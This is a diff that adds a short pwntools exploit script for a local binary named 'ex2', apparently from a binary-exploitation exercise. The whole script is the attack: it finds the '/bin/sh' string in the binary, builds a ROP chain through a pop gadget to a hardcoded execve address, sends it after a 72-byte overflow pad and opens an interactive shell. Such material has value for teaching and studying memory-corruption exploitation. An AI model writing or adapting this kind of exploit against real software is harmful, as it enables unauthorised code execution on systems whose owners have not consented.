@@ -1,0 +1,32 @@
+from pwn import *
+
+exe = context.binary = ELF('./bin/ex2')
+
+
+ephemereal = next(exe.search(b'/bin/sh'))
+
+pop_rsi_pop_rdi_pop_rbp_ret = 0x00000000004012b0  #ROPgadget --binary ./bin/ex2 | grep 'pop rdi'
+
+execve = 0x7ffff7ceb080  
+
+
+rop = ROP(exe)
+rop.raw(pop_rsi_pop_rdi_pop_rbp_ret)  # Set rsi, rdi, and rbp
+rop.raw(0)                            # Set rsi to NULL (second argument for execve)
+rop.raw(ephemereal)                   # Set rdi to '/bin/sh' (first argument for execve)
+rop.raw(0)                            # Set rbp to 0 (filler value)
+rop.raw(execve)                       # Call execve("/bin/sh", NULL, NULL)
+
+
+offset = 72
+
+
+payload = flat(
+    b'A' * offset,     
+    rop.chain()         # ROP chain to call execve
+)
+
+# Execute the exploit
+p = process(exe.path)
+p.sendline(payload)  
+p.interactive()
